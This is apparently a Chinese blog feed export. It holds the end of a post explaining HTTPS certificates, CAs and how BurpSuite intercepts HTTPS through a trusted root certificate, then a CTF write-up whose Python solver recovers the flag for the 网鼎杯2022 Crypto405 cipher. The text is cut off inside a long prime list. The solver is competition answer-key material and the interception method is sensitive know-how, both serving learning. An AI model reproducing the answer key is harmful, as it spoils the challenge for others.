href="#证书与-ca"></a> 证书与 CA</h1><h2 id="证书"><a class="markdownIt-Anchor" href="#证书"></a> 证书</h2><p>众所周知，http 服务是很不安全的，所以需要在 http 基础上提供加密、认证、完整性保护的 https 服务。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fjro2r2Z1E0FcJcouhCFbiFruCi4.png" alt="" />图源：HTTP 图解 7.2.1</p><p>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（SecureSocketLayer）和 TLS（TransportLayerSecurity）协议代替而已。通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnatvsZAWzeM4BA_AqxM_ga4EN3S.png" alt="" />SSL 加密采用非对称加密体制（公钥加密）来交换会话密钥，为了确保公钥来源的可靠性（公钥没有被攻击者替换），这就需要一个可靠可信的 CA（数字证书认证机构，Certificate Authority）负责发放和管理数字证书，承担公钥体系中公钥的合法性检验的责任。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlVis-fQX5ZCu3uVAY25ygBsYTX7.png" alt="" />服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。所以这里就需要一个可信的数字证书认证机构，通过 CA 的可信度来推得证书的可信度。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FuZQKFe7VsBSuCe2K6yZecz2KKuR.png" alt="" /></p><h2 id="bp-的-https-交互过程"><a class="markdownIt-Anchor" href="#bp-的-https-交互过程"></a> BP 的 https 交互过程</h2><p>BurpSuite 的基本思路是伪装成目标 https 服务器（中间人攻击），让浏览器（client）相信 BurpSuite 就是目标站点。为了达成目标，BurpSuite 必须：</p><ul><li>生成一对公私钥，并将公钥和目标域名绑定并封装为证书；</li><li>让浏览器相信此证书，即通过证书验证。</li></ul><p>所以， BurpSuite 需要在操作系统添加一个根证书，这个根证书可以让浏览器信任所有 BurpSuite 颁发的证书。具体流程如下：</p><pre><code>Client                     BurpSuite                             Server|-----https(tcp 443) req------&gt; |</code></pre><p>Generate an certificate1 boundwith the target domain|&lt;------ -certificate1----------&gt;||&lt;-------SSL negotiation--------&gt;||&lt;-----security connection------&gt;|| -------https(tcp 443) req----------&gt;||&lt;-------certificate2----------------&gt;||&lt;----------SSL connection--------&gt;||&lt;-------security connection------&gt;|之后，BurpSuite 拥有了两套对称密钥，一套用于与 client 交互，另外一套与 server 交互，而在 BurpSuite 处可以获得 https 明文。</p><h2 id="windows-证书存储"><a class="markdownIt-Anchor" href="#windows-证书存储"></a> Windows 证书存储</h2><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq-_W6yTILAzRE0qD8Y140IffWVG.png" alt="" />每个 windows 系统证书存储具有以下类型：</p><ul><li>本地计算机证书存储这种类型的证书存储是计算机的本地证书存储，并且对于计算机上的所有用户都是全局性的。 此证书存储位于注册表中 HKEY_LOCAL_MACHINE 根下。</li><li>当前用户证书存储此类型的证书存储区是计算机上用户帐户的本地证书。 此证书存储位于注册表中 HKEY_CURRENT_USER 根下。</li></ul><p>当前 用户/个人存储区之外 的所有当前用户证书存储都将继承本地计算机证书存储的内容。Windows 的 PnP 管理器验证成功数字签名的条件：</p><ul><li>用于创建签名的签名证书由 CA 颁发。</li><li>CA 对应的根证书安装在 &quot; <strong>受信任的根证书颁发机构</strong>&quot; 证书存储中，&quot;受信任的根证书颁发机构&quot; 证书存储包含所有 Windows 信任的 ca 的根证书。</li></ul><p>所以一般抓 HTTPS 流量代理软件的证书需要安装到<code>受信任的根证书颁发机构</code>。其他存储位置：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FliSX0VFSGNBfR6mCPIAfGiHXVvR.png" alt="" /></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2022 青龙组 Crypto405 WP</title>
      <link href="/2022/08/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%20%E9%9D%92%E9%BE%99%E7%BB%84%20Crypto405%20WP/"/>
      <url>/2022/08/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%20%E9%9D%92%E9%BE%99%E7%BB%84%20Crypto405%20WP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我是菜鸡，只做出来密码学的题 1551</p></blockquote><p>分析源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="title function_ invoke__">getPrime</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">k = [<span class="title function_ invoke__">randrange</span>(<span class="number">1</span>,p) <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(flag)):</span><br><span class="line">    grasshopper = flag[i]</span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">        k[j] = grasshopper = grasshopper * k[j] % p</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;Grasshopper#&#x27;</span>+<span class="title function_ invoke__">str</span>(i).<span class="title function_ invoke__">zfill</span>(<span class="number">2</span>)+<span class="string">&#x27;:&#x27;</span>+<span class="title function_ invoke__">hex</span>(grasshopper)[<span class="number">2</span>:].<span class="title function_ invoke__">zfill</span>(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>p 是一个未知 16bit 素数，k 是五个随机数组成的队列。进入到循环是五次模乘，输出该行最后一个结果。如果将所有的 k 列表组成一个 41*5 的矩阵 K，那么最后的输出结果就是该矩阵的最后一列。根据 output.txt，可以获得最后一列的数据。从 output.txt 中获取数据并转成十进制整型数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        grass.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + line.split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>].decode(), <span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>然后根据<code>k[j] = grasshopper = grasshopper * k[j] % p</code>，可以推的 K[i][j]_K[i-1][j+1]=K[i][j+1] mod p由此可以推的第四列数据：K[i][4] _ K[i-1][5] = K[i][5] mod p (i&gt;1)，已知 K[i-1][5]和 K[i][5] ，编写代码求得 k[i][4] i&gt;1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">findFactor</span>(before, after, p):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (before + p * i) % after != <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (before + p * i) / after</span><br></pre></td></tr></table></figure><p>以此类推，可以求得第 1~4 列的数据，除了 K[0][0]<sub>K[0][3],K[1][0]</sub>K[1][2],K[2][0]~K[2][1],K[3][0]由于初始 k 列表未知不可获得。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">k_box = []</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">line = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">line[<span class="number">4</span>] = grass[i]</span><br><span class="line">k_box.append(line)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">k_box[i + <span class="number">1</span>][<span class="number">3</span>] = (findFactor(k_box[i + <span class="number">1</span>][<span class="number">4</span>], k_box[i][<span class="number">4</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">k_box[i + <span class="number">2</span>][<span class="number">2</span>] = (findFactor(k_box[i + <span class="number">2</span>][<span class="number">3</span>], k_box[i + <span class="number">1</span>][<span class="number">3</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">k_box[i + <span class="number">3</span>][<span class="number">1</span>] = (findFactor(k_box[i + <span class="number">3</span>][<span class="number">2</span>], k_box[i + <span class="number">2</span>][<span class="number">2</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">k_box[i + <span class="number">4</span>][<span class="number">0</span>] = (findFactor(k_box[i + <span class="number">4</span>][<span class="number">1</span>], k_box[i + <span class="number">3</span>][<span class="number">1</span>], p))</span><br></pre></td></tr></table></figure><p>再次回顾<code>K[j] = grasshopper = grasshopper * K[j] % p</code>，flag[i]* K[i-1][0] % p = K[i][0]，所以由 K[i-1][0]和 K[i][0]已经求得，即可推出 flag[i],i&gt;4。不过因为 flag 格式已知，前五位是<code>flag&#123;</code>。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">41</span>):</span><br><span class="line">res.append(<span class="built_in">int</span>(findFactor(k_box[i + <span class="number">1</span>][<span class="number">0</span>], k_box[i][<span class="number">0</span>], p)))</span><br></pre></td></tr></table></figure><p>还有最后一个问题，p 未知，直接生成比 K 矩阵最后一列所有数据都大（58767）的 16 位素数列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">58769</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">    primes.<span class="title function_ invoke__">append</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">58769</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">    j = <span class="number">2</span></span><br><span class="line">    jud = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">2</span>, <span class="title function_ invoke__">round</span>(math.<span class="title function_ invoke__">sqrt</span>(i)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % j != <span class="number">0</span>:</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            jud = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> jud == <span class="number">0</span>:</span><br><span class="line">        primes.<span class="title function_ invoke__">remove</span>(i)</span><br></pre></td></tr></table></figure><p>遍历解密，如果成功解密，即找到素数 p，解密结果即 flag。全部代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import math</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># primes = []</span></span><br><span class="line"><span class="comment"># for i in range(58769, 2 ** 16):</span></span><br><span class="line"><span class="comment">#     primes.append(i)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for i in range(58769, 2 ** 16):</span></span><br><span class="line"><span class="comment">#     j = 2</span></span><br><span class="line"><span class="comment">#     jud = 1</span></span><br><span class="line"><span class="comment">#     for j in range(2, round(math.sqrt(i)) + 1):</span></span><br><span class="line"><span class="comment">#         if i % j != 0:</span></span><br><span class="line"><span class="comment">#             j = j + 1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             jud = 0</span></span><br><span class="line"><span class="comment">#     if jud == 0:</span></span><br><span class="line"><span class="comment">#         primes.remove(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findFactor</span>(<span class="params">before, after, p</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (before + p * i) % after != <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (before + p * i) / after</span><br><span class="line"></span><br><span class="line">grass = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        grass.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + line.split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>].decode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(grass))</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">58771</span>, <span class="number">58787</span>, <span class="number">58789</span>, <span class="number">58831</span>,</span><br><span class="line">          <span class="number">58889</span>, <span class="number">58897</span>, <span class="number">58901</span>, <span class="number">58907</span>, <span class="number">58909</span>, <span class="number">58913</span>, <span class="number">58921</span>, <span class="number">58937</span>, <span class="number">58943</span>, <span class="number">58963</span>, <span class="number">58967</span>, <span class="number">58979</span>, <span class="number">58991</span>, <span class="number">58997</span>, <span class="number">59009</span>,</span><br><span class="line">          <span class="number">59011</span>, <span class="number">59021</span>, <span class="number">59023</span>, <span class="number">59029</span>, <span class="number">59051</span>, <span class="number">59053</span>, <span class="number">59063</span>, <span class="number">59069</span>, <span class="number">59077</span>, <span class="number">59083</span>, <span class="number">59093</span>, <span class="number">59107</span>, <span class="number">59113</span>, <span class="number">59119</span>, <span class="number">59123</span>,</span><br><span class="line">          <span class="number">59141</span>, <span class="number">59149</span>, <span class="number">59159</span>, <span class="number">59167</span>, <span class="number">59183</span>, <span class="number">59197</span>, <span class="number">59207</span>, <span class="number">59209</span>, <span class="number">59219</span>, <span class="number">59221</span>, <span class="number">59233</span>, <span class="number">59239</span>, <span class="number">59243</span>, <span class="number">59263</span>, <span class="number">59273</span>,</span><br><span class="line">          <span class="number">59281</span>, <span class="number">59333</span>, <span class="number">59341</span>, <span class="number">59351</span>, <span class="number">59357</span>, <span class="number">59359</span>, <span class="number">59369</span>, <span class="number">59377</span>, <span class="number">59387</span>, <span class="number">59393</span>, <span class="number">59399</span>, <span class="number">59407</span>, <span class="number">59417</span>, <span class="number">59419</span>, <span class="number">59441</span>,</span><br><span class="line">          <span class="number">59443</span>, <span class="number">59447</span>, <span class="number">59453</span>, <span class="number">59467</span>, <span class="number">59471</span>, <span class="number">59473</span>, <span class="number">59497</span>, <span class="number">59509</span>, <span class="number">59513</span>, <span class="number">59539</span>, <span class="number">59557</span>, <span class="number">59561</span>, <span class="number">59567</span>, <span class="number">59581</span>, <span class="number">59611</span>,</span><br><span class="line">          <span class="number">59617</span>, <span class="number">59621</span>, <span class="number">59627</span>, <span class="number">59629</span>, <span class="number">59651</span>, <span class="number">59659</span>, <span class="number">59663</span>, <span class="number">59669</span>, <span class="number">59671</span>, <span class="number">59693</span>, <span class="number">59699</span>, <span class="number">59707</span>, <span class="number">59723</span>, <span class="number">59729</span>, <span class="number">59743</span>,</span><br><span class="line">          <span class="number">59747</span>, <span class="number">59753</span>, <span class="number">59771</span>, <span class="number">59779</span>, <span class="number">59791</span>, <span class="number">59797</span>, <span class="number">59809</span>, <span class="number">59833</span>, <span class="number">59863</span>, <span class="number">59879</span>, <span class="number">59887</span>, <span class="number">59921</span>, <span class="number">59929</span>, <span class="number">59951</span>, <span class="number">59957</span>,</span><br><span class="line">          <span class="number">59971</span>, <span class="number">59981</span>, <span class="number">59999</span>, <span class="number">60013</span>, <span class="number">60017</span>, <span class="number">60029</span>, <span class="number">60037</span>, <span class="number">60041</span>, <span class="number">60077</span>, <span class="number">60083</span>, <span class="number">60089</span>, <span class="number">60091</span>, <span class="number">60101</span>, <span class="number">60103</span>, <span class="number">60107</span>,</span><br><span class="line">          <span class="number">60127</span>, <span class="number">60133</span>, <span class="number">60139</span>, <span class="number">60149</span>, <span class="number">60161</span>, <span class="number">60167</span>, <span class="number">60169</span>, <span class="number">60209</span>, <span class="number">60217</span>, <span class="number">60223</span>, <span class="number">60251</span>, <span class="number">60257</span>, <span class="number">60259</span>, <span class="number">60271</span>, <span class="number">60289</span>,</span><br><span class="line">          <span class="number">60293</span>, <span class="number">60317</span>, <span class="number">60331</span>, <span class="number">60337</span>, <span class="number">60343</span>, <span class="number">60353</span>, <span class="number">60373</span>, <span class="number">60383</span>, <span class="number">60397</span>, <span class="number">60413</span>, <span class="number">60427</span>, <span class="number">60443</span>, <span class="number">60449</span>, <span class="number">60457</span>, <span class="number">60493</span>,</span><br><span class="line">          <span class="number">60497</span>, <span class="number">60509</span>, <span class="number">60521</span>, <span class="number">60527</span>, <span class="number">60539</span>, <span class="number">60589</span>, <span class="number">60601</span>, <span class="number">60607</span>, <span class="number">60611</span>, <span class="number">60617</span>, <span class="number">60623</span>, <span class="number">60631</span>, <span class="number">60637</span>, <span class="number">60647</span>, <span class="number">60649</span>,</span><br><span class="line">          <span class="number">60659</span>, <span class="number">60661</span>, <span class="number">60679</span>, <span class="number">60689</span>, <span class="number">60703</span>, <span class="number">60719</span>, <span class="number">60727</span>, <span class="number">60733</span>, <span class="number">60737</span>, <span class="number">60757</span>, <span class="number">60761</span>, <span class="number">60763</span>, <span class="number">60773</span>, <span class="number">60779</span>, <span class="number">60793</span>,</span><br><span class="line">          <span class="number">60811</span>, <span class="number">60821</span>, <span class="number">60859</span>, <span class="number">60869</span>, <span class="number">60887</span>, <span class="number">60889</span>, <span class="number">60899</span>, <span class="number">60901</span>, <span class="number">60913</span>, <span class="number">60917</span>, <span class="number">60919</span>, <span class="number">60923</span>, <span class="number">60937</span>, <span class="number">60943</span>, <span class="number">60953</span>,</span><br><span class="line">          <span class="number">60961</span>, <span class="number">61001</span>, <span class="number">61007</span>, <span class="number">61027</span>, <span class="number">61031</span>, <span class="number">61043</span>, <span class="number">61051</span>, <span class="number">61057</span>, <span class="number">61091</span>, <span class="number">61099</span>, <span class="number">61121</span>, <span class="number">61129</span>, <span class="number">61141</span>, <span class="number">61151</span>, <span class="number">61153</span>,</span><br><span class="line">          <span class="number">61169</span>, <span class="number">61211</span>, <span class="number">61223</span>, <span class="number">61231</span>, <span class="number">61253</span>, <span class="number">61261</span>, <span class="number">61283</span>, <span class="number">61291</span>, <span class="number">61297</span>, <span class="number">61331</span>, <span class="number">61333</span>, <span class="number">61339</span>, <span class="number">61343</span>, <span class="number">61357</span>, <span class="number">61363</span>,</span><br><span class="line">          <span class="number">61379</span>, <span class="number">61381</span>, <span class="number">61403</span>, <span class="number">61409</span>, <span class="number">61417</span>, <span class="number">61441</span>, <span class="number">61463</span>, <span class="number">61469</span>, <span class="number">61471</span>, <span class="number">61483</span>, <span class="number">61487</span>, <span class="number">61493</span>, <span class="number">61507</span>, <span class="number">61511</span>, <span class="number">61519</span>,</span><br><span class="line">          <span class="number">61543</span>, <span class="number">61547</span>, <span class="number">61553</span>, <span class="number">61559</span>, <span class="number">61561</span>, <span class="number">61583</span>, <span class="number">61603</span>, <span class="number">61609</span>, <span class="number">61613</span>, <span class="number">61627</span>, <span class="number">61631</span>, <span class="number">61637</span>, <span class="number">61643</span>, <span class="number">61651</span>, <span class="number">61657</span>,</span><br><span class="line">          <span class="number">61667</span>, <span class="number">61673</span>, <span class="number">61681</span>, <span class="number">61687</span>, <span class="number">61703</span>, <span class="number">61717</span>, <span class="number">61723</span>, <span class="number">61729</span>, <span class="number">61751</span>, <span class="number">61757</span>, <span class="number">61781</span>, <span class="number">61813</span>, <span class="number">61819</span>, <span class="number">61837</span>, <span class="number">61843</span>,</span><br><span class="line">          <span class="number">61861</span>, <span class="number">61871</span>, <span class="number">61879</span>, <span class="number">61909</span>, <span class="number">61927</span>, <span class="number">61933</span>, <span class="number">61949</span>, <span class="number">61961</span>, <span class="number">61967</span>, <span class="number">61979</span>, <span class="number">61981</span>, <span class="number">61987</span>, <span class="number">61991</span>, <span class="number">62003</span>, <span class="number">62011</span>,</span><br><span class="line">          <span class="number">62017</span>, <span class="number">62039</span>, <span class="number">62047</span>, <span class="number">62053</span>, <span class="number">62057</span>, <span class="number">62071</span>, <span class="number">62081</span>, <span class="number">62099</span>, <span class="number">62119</span>, <span class="number">62129</span>, <span class="number">62131</span>, <span class="number">62137</span>, <span class="number">62141</span>, <span class="number">62143</span>, <span class="number">62171</span>,</span><br><span class="line">          <span class="number">62189</span>, <span class="number">62191</span>, <span class="number">62201</span>, <span class="number">62207</span>, <span class="number">62213</span>, <span class="number">62219</span>, <span class="number">62233</span>, <span class="number">62273</span>, <span class="number">62297</span>, <span class="number">62299</span>, <span class="number">62303</span>, <span class="number">62311</span>, <span class="number">62323</span>, <span class="number">62327</span>, <span class="number">62347</span>,</span><br><span class="line">          <span class="number">62351</span>, <span class="number">62383</span>, <span class="number">62401</span>, <span class="number">62417</span>, <span class="number">62423</span>, <span class="number">62459</span>, <span class="number">62467</span>, <span class="number">62473</span>, <span class="number">62477</span>, <span class="number">62483</span>, <span class="number">62497</span>, <span class="number">62501</span>, <span class="number">62507</span>, <span class="number">62533</span>, <span class="number">62539</span>,</span><br><span class="line">          <span class="number">62549</span>, <span class="number">62563</span>, <span class="number">62581</span>, <span class="number">62591</span>, <span class="number">62597</span>, <span class="number">62603</span>, <span class="number">62617</span>, <span class="number">62627</span>, <span class="number">62633</span>, <span class="number">62639</span>, <span class="number">62653</span>, <span class="number">62659</span>, <span class="number">62683</span>, <span class="number">62687</span>, <span class="number">62701</span>,</span><br><span class="line">          <span class="number">62723</span>, <span class="number">62731</span>, <span class="number">62743</span>, <span class="number">62753</span>, <span class="number">62761</span>, <span class="number">62773</span>, <span class="number">62791</span>, <span class="number">62801</span>, <span class="number">62819</span>, <span class="number">62827</span>, <span class="number">62851</span>, <span class="number">62861</span>, <span class="number">62869</span>, <span class="number">62873</span>, <span class="number">62897</span>,</span><br><span class="line">          <span class="number">62903</span>, <span class="number">62921</span>, <span class="number">62927</span>, <span class="number">62929</span>, <span class="number">62939</span>, <span class="number">62969</span>, <span class="number">62971</span>, <span class="number">62981</span>, <span class="number">62983</span>, <span class="number">62987</span>, <span class="number">62989</span>, <span class="number">63029</span>, <span class="number">63031</span>, <span class="number">63059</span>, <span class="number">63067</span>,</span><br><span class="line">          <span class="number">63073</span>, <span class="number">63079</span>, <span class="number">63097</span>, <span class="number">63103</span>, <span class="number">63113</span>, <span class="number">63127</span>, <span class="number">63131</span>, <span class="number">63149</span>, <span class="number">63179</span>, <span class="number">63197</span>, <span class="number">63199</span>, <span class="number">63211</span>, <span class="number">63241</span>, <span class="number">63247</span>, <span class="number">63277</span>,</span><br><span class="line">          <span class="number">63281</span>, <span class="number">63299</span>, <span class="number">63311</span>, <span class="number">63313</span>, <span class="number">63317</span>, <span class="number">63331</span>, <span class="number">63337</span>, <span class="number">63347</span>, <span class="number">63353</span>, <span class="number">63361</span>, <span class="number">63367</span>, <span class="number">63377</span>, <span class="number">63389</span>, <span class="number">63391</span>, <span class="number">63397</span>,</span><br><span class="line">          <span class="number">63409</span>, <span class="number">63419</span>, <span class="number">63421</span>, <span class="number">63439</span>, <span class="number">63443</span>, <span class="number">63463</span>, <span class="number">63467</span>, <span class="number">63473</span>, <span class="number">63487</span>, <span class="number">63493</span>, <span class="number">63499</span>, <span class="number">63521</span>, <span class="number">63527</span>, <span class="number">63533</span>, <span class="number">63541</span>,</span><br><span class="line">          <span class="number">63559</span>, <span class="number">63577</span>, <span class="number">63587</span>, <span class="number">63589</span>, <span class="number">63599</span>, <span class="number">63601</span>, <span class="number">63607</span>, <span class="number">63611</span>, <span class="number">63617</span>, <span class="number">63629</span>, <span class="number">63647</span>, <span class="number">63649</span>, <span class="number">63659</span>, <span class="number">63667</span>, <span class="number">63671</span>,</span><br><span class="line">          <span class="number">63689</span>, <span class="number">63691</span>, <span class="number">63697</span>, <span class="number">63703</span>, <span class="number">63709</span>, <span class="number">63719</span>, <span class="number">63727</span>, <span class="number">63737</span>, <span class="number">63743</span>, <span class="number">63761</span>, <span class="number">63773</span>, <span class="number">63781</span>, <span class="number">63793</span>, <span class="number">63799</span>, <span class="number">63803</span>,</span><br><span class="line">          <span class="number">63809</span>, <span class="number">63823</span>, <span class="number">63839</span>, <span class="number">63841</span>, <span class="number">63853</span>, <span class="number">63857</span>, <span class="number">63863</span>, <span class="number">63901</span>, <span class="number">63907</span>, <span class="number">63913</span>, <span class="number">63929</span>, <span class="number">63949</span>, <span class="number">63977</span>, <span class="number">63997</span>, <span class="number">64007</span>,</span><br><span class="line">          <span class="number">64013</span>, <span class="number">64019</span>, <span class="number">64033</span>, <span class="number">64037</span>, <span class="number">64063</span>, <span class="number">64067</span>, <span class="number">64081</span>, <span class="number">64091</span>, <span class="number">64109</span>, <span class="number">64123</span>, <span class="number">64151</span>, <span class="number">64153</span>, <span class="number">64157</span>, <span class="number">64171</span>, <span class="number">64187</span>,</span><br><span class="line">          <span class="number">64189</span>, <span class="number">64217</span>, <span class="number">64223</span>, <span class="number">64231</span>, <span class="number">64237</span>, <span class="number">64271</span>, <span class="number">64279</span>, <span class="number">64283</span>, <span class="number">64301</span>, <span class="number">64303</span>, <span class="number">64319</span>, <span class="number">64327</span>, <span class="number">64333</span>, <span class="number">64373</span>, <span class="number">64381</span>,</span><br><span class="line">          <span class="number">64399</span>, <span class="number">64403</span>, <span class="number">64433</span>, <span class="number">64439</span>, <span class="number">64451</span>, <span class="number">64453</span>, <span class="number">64483</span>, <span class="number">64489</span>, <span class="number">64499</span>, <span class="number">64513</span>, <span class="number">64553</span>, <span class="number">64567</span>, <span class="number">64577</span>, <span class="number">64579</span>, <span class="number">64591</span>,</span><br><span class="line">          <span class="number">64601</span>, <span class="number">64609</span>, <span class="number">64613</span>, <span class="number">64621</span>, <span class="number">64627</span>, <span class="number">64633</span>, <span class="number">64661</span>, <span 